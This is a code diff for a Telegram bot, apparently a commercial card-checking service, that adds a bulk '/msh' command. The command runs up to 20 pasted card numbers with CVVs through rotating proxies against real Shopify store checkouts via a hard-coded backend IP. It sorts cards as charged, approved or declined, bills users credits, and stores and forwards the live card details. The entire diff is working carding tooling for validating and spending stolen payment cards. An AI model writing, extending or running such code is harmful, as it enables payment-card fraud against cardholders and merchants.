@@ -5718,8 +5718,306 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
       }
 
       // ─────────────────────────────────────────────────────────
-      // USER START PAGE CALLBACKS
+      // MULTI SHOPIFY CHARGE (/msh) PRICE GROUP CALLBACK
       // ─────────────────────────────────────────────────────────
+
+      if (callbackData === "msh_nosite") {
+        await answerCallbackQuery(update.callback_query.id, "❌ No sites available in this price range");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      if (callbackData.startsWith("msh_price_")) {
+        const mshParts = callbackData.replace("msh_price_", "").split("_");
+        const mshPriceMin = parseInt(mshParts[0]);
+        const mshPriceMax = parseInt(mshParts[1]);
+        const mshEncodedCards = mshParts.slice(2).join("_");
+
+        let mshCards: string[] = [];
+        try { mshCards = atob(mshEncodedCards).split("\n").filter(c => c.trim()); } catch {
+          await answerCallbackQuery(update.callback_query.id, "❌ Invalid card data");
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        if (!mshCards.length || !callbackChatId || !messageId) {
+          await answerCallbackQuery(update.callback_query.id, "❌ Invalid request");
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        await answerCallbackQuery(update.callback_query.id, `⚡ Checking ${mshCards.length} cards on $${mshPriceMin}-$${mshPriceMax}...`);
+
+        const { data: mshProfile } = await supabase
+          .from("profiles")
+          .select("user_id, username, credits, is_banned")
+          .eq("telegram_chat_id", callbackChatId)
+          .maybeSingle();
+
+        if (!mshProfile) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Account not found.</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+        if (mshProfile.is_banned) {
+          await editTelegramMessage(callbackChatId, messageId, `🚫 <b>Account Suspended</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+        if (mshProfile.credits < mshCards.length) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mshCards.length}</b> credits. Balance: <b>${mshProfile.credits}</b>`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        // Fetch sites
+        let mshSitesQuery = supabase.from("gateway_urls").select("url, price").not("url", "like", "https://razorpay.me/%").lte("price", 100);
+        if (mshPriceMin > 0) mshSitesQuery = mshSitesQuery.gt("price", mshPriceMin);
+        if (mshPriceMax < 100) mshSitesQuery = mshSitesQuery.lte("price", mshPriceMax);
+        else mshSitesQuery = mshSitesQuery.gt("price", 0);
+        const { data: mshSites } = await mshSitesQuery.order("created_at", { ascending: false });
+
+        if (!mshSites || mshSites.length === 0) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No sites available</b> in $${mshPriceMin}-$${mshPriceMax} range.`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        // Fetch proxies
+        const { data: mshProxies } = await supabase.from("user_proxies").select("*").eq("user_id", mshProfile.user_id);
+        if (!mshProxies || mshProxies.length < 1) {
+          await editTelegramMessage(callbackChatId, messageId, `❌ <b>No Proxies</b>\n\nAdd proxies at yunchicheck.com/dashboard → Proxies`, { inline_keyboard: [[{ text: "🔙 Back", callback_data: "menu_back" }]] });
+          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+        }
+
+        const SHOPIFY_API_URL_MSH = "http://108.165.12.183:8081/";
+        const MSH_DEBUG_CHAT = "-1003848532661";
+        const MSH_UNKNOWN_RETRIES = 3;
+        const mshStartTime = Date.now();
+
+        const mshBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
+        const mshProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
+        const mshSiteDeadIndicators = ["site dead"];
+        const mshUserAgents = [
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
+        ];
+
+        const mshFormatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
+        const mshFailedProxyIds: string[] = [];
+        const mshAvailableSites = [...mshSites].sort(() => Math.random() - 0.5);
+
+        // BIN lookup helper
+        const mshLookupBin = async (cardNum: string) => {
+          const bin = cardNum.replace(/\D/g, '').slice(0, 8);
+          let bank = "Unknown", country = "", countryCode = "XX";
+          try {
+            const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
+            if (r.ok) { const d = await r.json(); bank = d.bank?.name || "Unknown"; country = d.country?.name || ""; countryCode = d.country?.alpha2 || "XX"; }
+          } catch {}
+          const getF = (code: string) => { if (!code || code === 'XX') return '🌍'; return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); };
+          return { bank, country, flag: getF(countryCode) };
+        };
+
+        // Single call helper
+        const mshCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
+          const apiUrl = `${SHOPIFY_API_URL_MSH}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 45000);
+          try {
+            const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mshUserAgents[Math.floor(Math.random() * mshUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
+            clearTimeout(timeout);
+            const rawText = await resp.text();
+            if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            const rawLower = rawText.toLowerCase();
+            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
+              return { status: 'unknown', message: 'Transient', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            if (mshProxyDeadIndicators.some(ind => rawLower.includes(ind)))
+              return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
+            if (mshSiteDeadIndicators.some(ind => rawLower.includes(ind)))
+              return { status: 'dead', message: 'Site Dead', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, response: 'Site Dead' };
+            if (mshBadResponses.some(bad => rawLower.includes(bad.toLowerCase())))
+              return { status: 'dead', message: 'Bad response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            if (rawText.includes('DELIVERY_ADDRESS'))
+              return { status: 'dead', message: 'DELIVERY_ADDRESS', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'DELIVERY_ADDRESS' };
+
+            let price = 0, priceStr = '$0.00';
+            const pricePatterns = [/\$[\d,]+\.?\d*/g, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi];
+            for (const pattern of pricePatterns) { const matches = rawText.match(pattern); if (matches) { for (const m of matches) { const v = parseFloat(m.replace(/[^0-9.]/g, "")); if (!isNaN(v) && v > 0 && (v < price || price === 0)) { price = v; priceStr = `$${v.toFixed(2)}`; } } } }
+
+            let apiStatus = 'unknown', apiMessage = rawText, apiResponse = '';
+            try {
+              const json = JSON.parse(rawText);
+              if (json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
+              if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
+              apiMessage = json.message || json.msg || json.error || rawText;
+              if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎')
+                { apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged'; }
+              else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED')
+                { apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined'; }
+              else {
+                const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
+                if (combined.includes('order_completed') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
+                else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('otp_required') || combined.includes('3ds') || combined.includes('rejected') || combined.includes('restricted') || combined.includes('generic_decline')) apiStatus = 'dead';
+              }
+            } catch {
+              const lower = rawText.toLowerCase();
+              if (lower.includes('order completed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
+              else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('otp_required') || lower.includes('rejected')) apiStatus = 'dead';
+            }
+            return { status: apiStatus, message: apiMessage, price, priceStr, proxyDead: false, siteDead: false, response: apiResponse };
+          } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' }; }
+        };
+
+        // With retry
+        const mshCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
+          let result = await mshCallOnce(cardCC, siteUrl, proxy);
+          if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+          for (let retry = 1; retry <= MSH_UNKNOWN_RETRIES; retry++) {
+            await new Promise(r => setTimeout(r, 800 * retry));
+            result = await mshCallOnce(cardCC, siteUrl, proxy);
+            if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+          }
+          return result;
+        };
+
+        // Check a single card with site/proxy rotation
+        const mshCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
+          const shuffledProxies = [...mshProxies].filter(p => !mshFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
+          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
+          const maxSites = Math.min(2, mshAvailableSites.length);
+          for (let si = 0; si < maxSites; si++) {
+            const site = mshAvailableSites[si % mshAvailableSites.length];
+            for (const proxy of shuffledProxies) {
+              if (mshFailedProxyIds.includes(proxy.id)) continue;
+              const result = await mshCallWithRetry(cardCC, site.url, mshFormatProxy(proxy));
+              if (result.proxyDead) {
+                mshFailedProxyIds.push(proxy.id);
+                supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
+                continue;
+              }
+              if (result.siteDead) {
+                supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+                break;
+              }
+              if (result.status === 'live' || result.status === 'dead') {
+                return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+              }
+              return { status: 'unknown', response: result.response || result.message || 'Unknown', price: result.price > 0 ? result.priceStr : '$0.00' };
+            }
+          }
+          return { status: 'unknown', response: 'All attempts failed', price: '$0.00' };
+        };
+
+        // Results array
+        interface MshResult { cc: string; status: string; response: string; price: string; bank: string; flag: string; }
+        const mshResults: MshResult[] = [];
+        let mshCharged = 0, mshApproved = 0, mshDeclined = 0;
+        let mshTotalCost = 0;
+
+        // Build live update message
+        const buildMshMessage = (checked: number, total: number, elapsed: string) => {
+          let msg = `𝗦𝗛𝗢𝗣𝗜𝗙𝗬 • Charge | ${checked}/${total} | ${elapsed}s\n\n`;
+          const counters: string[] = [];
+          if (mshCharged > 0) counters.push(`💎 ${mshCharged} Charged`);
+          if (mshApproved > 0) counters.push(`✅ ${mshApproved} Approved`);
+          if (mshDeclined > 0) counters.push(`❌ ${mshDeclined} Declined`);
+          if (counters.length > 0) msg += counters.join('   ') + '\n';
+
+          for (const r of mshResults) {
+            let emoji = '⚠️';
+            if (r.status === 'live') emoji = '💎';
+            else if (r.status === 'dead') emoji = '❌';
+            else emoji = '✅';
+
+            msg += `\n${escapeHtml(r.cc)}\n`;
+            msg += `${emoji} ${escapeHtml(r.response)} | ${escapeHtml(r.price)}\n`;
+            msg += `<i>${escapeHtml(r.bank)} ${r.flag}</i>\n`;
+          }
+
+          return msg;
+        };
+
+        // Show initial processing message
+        await editTelegramMessage(callbackChatId, messageId, `𝗦𝗛𝗢𝗣𝗜𝗙𝗬 • Charge | 0/${mshCards.length} | 0.00s\n\n⏳ <i>Starting bulk check...</i>`);
+
+        // Process cards one by one
+        for (let i = 0; i < mshCards.length; i++) {
+          const cardCC = mshCards[i].trim();
+          if (!cardCC) continue;
+
+          const cardParts = cardCC.split("|");
+          if (cardParts.length < 4 || !cardParts[3] || cardParts[3].length < 3) {
+            mshResults.push({ cc: cardCC, status: 'error', response: 'Invalid format', price: '$0.00', bank: 'N/A', flag: '🌍' });
+            mshDeclined++;
+            continue;
+          }
+
+          // BIN lookup
+          const binInfo = await mshLookupBin(cardParts[0]);
+
+          // Check card
+          const result = await mshCheckCard(cardCC);
+
+          // Classify
+          let statusType: string;
+          const respLower = (result.response || '').toLowerCase();
+          if (result.status === 'live') {
+            if (respLower.includes('order_completed') || respLower.includes('order completed')) { mshCharged++; statusType = 'live'; }
+            else { mshApproved++; statusType = 'approved'; }
+          } else if (result.status === 'dead') {
+            mshDeclined++; statusType = 'dead';
+          } else {
+            // Check if it's a soft approval (3DS, OTP)
+            if (respLower.includes('3ds') || respLower.includes('otp') || respLower.includes('required')) { mshApproved++; statusType = 'approved'; }
+            else { mshDeclined++; statusType = 'dead'; }
+          }
+
+          // Credit deduction
+          let cardCost = 0;
+          if (result.status === 'live') cardCost = 2;
+          else if (result.status === 'dead') cardCost = 1;
+          mshTotalCost += cardCost;
+
+          if (cardCost > 0) {
+            await supabase.from("profiles").update({ credits: mshProfile.credits - mshTotalCost, updated_at: new Date().toISOString() }).eq("user_id", mshProfile.user_id);
+            await supabase.from("card_checks").insert({ user_id: mshProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: result.status === "live" ? "charged" : "dead" });
+          } else {
+            await supabase.from("card_checks").insert({ user_id: mshProfile.user_id, card_details: cardCC, gateway: "shopify_charge", status: "completed", result: "unknown" });
+          }
+
+          // Notify charged
+          if (result.status === 'live' && SUPABASE_SERVICE_ROLE_KEY) {
+            fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+              method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` },
+              body: JSON.stringify({ user_id: mshProfile.user_id, card_details: cardCC, status: 'CHARGED', response_message: result.response, amount: result.price, gateway: 'Shopify Charge' }),
+            }).catch(() => {});
+          }
+
+          mshResults.push({
+            cc: cardCC,
+            status: statusType,
+            response: result.response || 'N/A',
+            price: result.price,
+            bank: binInfo.bank,
+            flag: binInfo.flag,
+          });
+
+          // Update message every card
+          const elapsed = ((Date.now() - mshStartTime) / 1000).toFixed(2);
+          try {
+            await editTelegramMessage(callbackChatId, messageId, buildMshMessage(i + 1, mshCards.length, elapsed));
+          } catch {}
+        }
+
+        // Final message
+        const mshElapsed = ((Date.now() - mshStartTime) / 1000).toFixed(2);
+        const mshNewBalance = mshProfile.credits - mshTotalCost;
+        let finalMsg = buildMshMessage(mshCards.length, mshCards.length, mshElapsed);
+        finalMsg += `\n<i>💰 Cost: -${mshTotalCost} credits ・ Balance: ${mshNewBalance}</i>`;
+        if (mshFailedProxyIds.length > 0) finalMsg += `\n🔴 <b>${mshFailedProxyIds.length} dead proxy removed</b>`;
+
+        await editTelegramMessage(callbackChatId, messageId, finalMsg, {
+          inline_keyboard: [[{ text: "🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data: "menu_back" }]]
+        });
+
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+
       
       if (callbackData === "user_mystatus") {
         const { data: profile } = await supabase
@@ -9749,6 +10047,127 @@ Example: <code>/sh 4111111111111111|12|25|123</code>
 
     // Handle sh_nosite callback (no sites available for that range)
     // (This is handled inline - the button just shows no sites)
+
+    // ─────────────────────────────────────────────────────────
+    // /msh - MULTI SHOPIFY CHARGE BULK CHECK (up to 20 cards)
+    // ─────────────────────────────────────────────────────────
+
+    if (text === "/msh" || text.startsWith("/msh ") || text.startsWith("/msh\n")) {
+      const mshInput = text.replace(/^\/msh\s*/, "").trim();
+
+      if (!mshInput) {
+        await sendTelegramMessage(chatId, `
+🛍 <b>𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>
+
+📌 <b>Usage:</b>
+<code>/msh
+cc|mm|yy|cvv
+cc|mm|yy|cvv
+cc|mm|yy|cvv</code>
+
+📎 <b>Example:</b>
+<code>/msh
+4111111111111111|12|25|123
+5333171146109372|10|26|100</code>
+
+📊 <b>Limits:</b> Up to <b>20 cards</b> per batch
+💎 Charged = 2 credits ・ ❌ Declined = 1 credit ・ ⚠️ Unknown = Free
+
+💡 <i>Cards are checked one by one with live results</i>
+`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Parse cards
+      const mshCardLines = mshInput.split("\n").map(l => l.trim()).filter(l => l && l.includes("|"));
+      if (mshCardLines.length === 0) {
+        await sendTelegramMessage(chatId, `❌ <b>No valid cards found.</b>\n\nFormat: <code>cc|mm|yy|cvv</code> (one per line)`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mshCardLines.length > 20) {
+        await sendTelegramMessage(chatId, `❌ <b>Too many cards.</b>\n\nMax <b>20 cards</b> per batch. You sent ${mshCardLines.length}.`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Check user
+      const { data: mshUserProfile } = await supabase
+        .from("profiles")
+        .select("user_id, username, credits, is_banned")
+        .eq("telegram_chat_id", chatId)
+        .maybeSingle();
+
+      if (!mshUserProfile) {
+        await sendTelegramMessage(chatId, `❌ <b>Account Not Connected</b>\n\nLink your Telegram at yunchicheck.com\n<b>Chat ID:</b> <code>${chatId}</code>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mshUserProfile.is_banned) {
+        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+      if (mshUserProfile.credits < mshCardLines.length) {
+        await sendTelegramMessage(chatId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mshCardLines.length}</b> credits for ${mshCardLines.length} cards.\nBalance: <b>${mshUserProfile.credits}</b>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Validate cards
+      const validCards: string[] = [];
+      for (const line of mshCardLines) {
+        const parts = line.split("|");
+        if (parts.length >= 4 && parts[3] && parts[3].length >= 3 && /^\d+$/.test(parts[3])) {
+          validCards.push(line);
+        }
+      }
+
+      if (validCards.length === 0) {
+        await sendTelegramMessage(chatId, `❌ <b>No valid cards.</b>\n\nFormat: <code>cc|mm|yy|cvv</code>`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Encode cards and show price selection
+      const mshEncodedCards = btoa(validCards.join("\n"));
+
+      // Fetch price group counts
+      const mshPriceGroups = [
+        { label: "$0 – $10", min: 0, max: 10, emoji: "💰" },
+        { label: "$10 – $20", min: 10, max: 20, emoji: "💎" },
+        { label: "$20 – $35", min: 20, max: 35, emoji: "🔥" },
+        { label: "$35 – $100", min: 35, max: 100, emoji: "⚡" },
+      ];
+
+      const mshGroupCounts = await Promise.all(
+        mshPriceGroups.map(async (g) => {
+          let query = supabase.from("gateway_urls").select("id", { count: "exact", head: true }).not("url", "like", "https://razorpay.me/%").lte("price", g.max === 100 ? 100 : g.max);
+          if (g.min > 0) query = query.gt("price", g.min);
+          else query = query.gt("price", 0);
+          const { count } = await query;
+          return { ...g, count: count || 0 };
+        })
+      );
+
+      const mshTotalSites = mshGroupCounts.reduce((a, g) => a + g.count, 0);
+
+      const mshPriceButtons: any[][] = [];
+      for (const g of mshGroupCounts) {
+        if (g.count > 0) {
+          mshPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  ${g.count} sites`, callback_data: `msh_price_${g.min}_${g.max}_${mshEncodedCards}` }]);
+        } else {
+          mshPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  0 sites ✖️`, callback_data: `msh_nosite` }]);
+        }
+      }
+      mshPriceButtons.push([{ text: `🎲 𝗔𝘂𝘁𝗼 – Any Range  •  ${mshTotalSites} sites`, callback_data: `msh_price_0_100_${mshEncodedCards}` }]);
+
+      await sendTelegramMessage(chatId, `
+🛍 <b>𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>
+
+📊 <b>${validCards.length} cards</b> loaded
+💰 <b>Balance:</b> ${mshUserProfile.credits} credits
+🌐 <b>Sites:</b> ${mshTotalSites} available
+
+⬇️ <b>𝗦𝗲𝗹𝗲𝗰𝘁 𝗣𝗿𝗶𝗰𝗲 𝗥𝗮𝗻𝗴𝗲</b> ⬇️
+`, { inline_keyboard: mshPriceButtons }, messageId);
+
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
 
     // ─────────────────────────────────────────────────────────
     // DEFAULT USER MESSAGE HANDLER
